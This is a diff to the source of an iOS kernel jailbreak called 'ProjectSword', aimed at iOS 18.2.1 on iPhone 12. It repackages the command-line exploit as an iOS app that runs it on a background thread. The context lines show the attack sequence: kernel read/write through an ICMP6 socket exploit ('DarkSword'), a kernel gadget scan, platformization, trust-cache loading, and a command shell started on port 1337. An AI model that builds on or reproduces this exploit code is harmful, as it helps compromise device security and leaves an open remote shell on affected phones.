@@ -1,4 +1,5 @@
 #import <Foundation/Foundation.h>
+#import <UIKit/UIKit.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -33,6 +34,7 @@ extern kern_return_t mach_vm_map(task_t, mach_vm_address_t *, mach_vm_size_t,
 #include "gadgets.h"
 #include "jailbreak.h"
 #include "shell.h"
+#include "AppDelegate.h"
 
 void IOSurfacePrefetchPages(IOSurfaceRef surface);
 void initialize_phys_read_write(uint64_t contiguous_mapping_size);
@@ -449,8 +451,8 @@ bool setupFugu14Kcall(void) { return false; }
 void platformize(void) { platformize_proc(); }
 bool tcload_load(const char *p) { return load_trust_cache(p); }
 
-// ===== Main =====
-int main(int argc, const char *argv[]) {
+// ===== Run Jailbreak (called by AppDelegate on background thread) =====
+void run_jailbreak(void) {
     @autoreleasepool {
         printf("=== ProjectSword - iOS 18.2.1 Jailbreak (iPhone 12 / A14) ===\n");
         printf("[*] Target: iPhone13,2 (A14) on iOS 18.2.1 (build 22C161)\n");
@@ -460,7 +462,7 @@ int main(int argc, const char *argv[]) {
         printf("[Phase 1/5] Gaining kernel R/W via ICMP6 socket exploit...\n");
         if (!run_darksword()) {
             printf("[-] DarkSword exploit failed!\n");
-            return -1;
+            return;
         }
         printf("[+] Kernel R/W achieved! (kread64/kwrite64)\n\n");
         
@@ -468,7 +470,7 @@ int main(int argc, const char *argv[]) {
         printf("[Phase 2/5] Scanning kernel for gadgets...\n");
         if (!scan_gadgets()) {
             printf("[-] Gadget scan failed!\n");
-            return -1;
+            return;
         }
         printf("[+] Kernel gadgets resolved!\n\n");
         
@@ -523,7 +525,14 @@ int main(int argc, const char *argv[]) {
         // Start command shell
         start_shell(1337);
     }
-    return 0;
+    return;
+}
+
+// ===== Entry point =====
+int main(int argc, char *argv[]) {
+    @autoreleasepool {
+        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
+    }
 }
 
 #pragma clang diagnostic pop
